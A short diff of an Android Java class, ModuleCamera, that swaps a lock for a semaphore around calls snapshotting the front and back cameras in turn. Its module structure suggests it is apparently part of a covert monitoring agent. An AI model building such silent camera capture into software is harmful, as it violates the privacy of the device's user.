@@ -94,12 +94,20 @@ public class ModuleCamera extends BaseInstantModule {
 		if (Build.VERSION.SDK_INT > Build.VERSION_CODES.HONEYCOMB) {
 			final CameraSnapshot camera = CameraSnapshot.self();
 
-			synchronized(Status.self().lockFramebuffer) {
-				camera.snapshot(Camera.CameraInfo.CAMERA_FACING_FRONT);
+			if (Status.self().semaphoreMediaserver.tryAcquire()) {
+				try{
+					camera.snapshot(Camera.CameraInfo.CAMERA_FACING_FRONT);
+				} finally {
+					Status.self().semaphoreMediaserver.release();
+				}
 			}
 			Utils.sleep(100);
-			synchronized(Status.self().lockFramebuffer) {
-				camera.snapshot(Camera.CameraInfo.CAMERA_FACING_BACK);
+			if (Status.self().semaphoreMediaserver.tryAcquire()) {
+				try{
+					camera.snapshot(Camera.CameraInfo.CAMERA_FACING_BACK);
+				} finally {
+					Status.self().semaphoreMediaserver.release();
+				}
 			}
 
 		}
